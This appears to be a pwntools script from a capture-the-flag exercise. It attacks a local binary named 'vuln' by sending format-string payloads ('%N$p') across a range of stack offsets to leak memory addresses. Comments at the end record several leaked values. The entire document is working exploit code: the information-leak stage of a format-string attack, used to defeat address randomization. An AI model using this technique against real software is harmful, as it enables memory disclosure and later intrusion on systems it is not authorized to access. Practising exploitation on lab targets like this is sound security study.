#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)

for i in range(600, 700):
    try:
        p = process(level='error')
        p.sendlineafter(b"What number would you like to guess?\n", b"-447")

        payload = "%{}$p".format(i).encode()
        p.sendlineafter(b"Name? ", payload)
        leak = p.recvline().decode().split()[-1]
        print(str(i) + ": " + str(leak))
        p.close()
    except:
        pass

# 119: 0x7e381e00
# 251: 0xfff85e00
# 264: 0xf7fa9000
# 280: 0xf7f3d000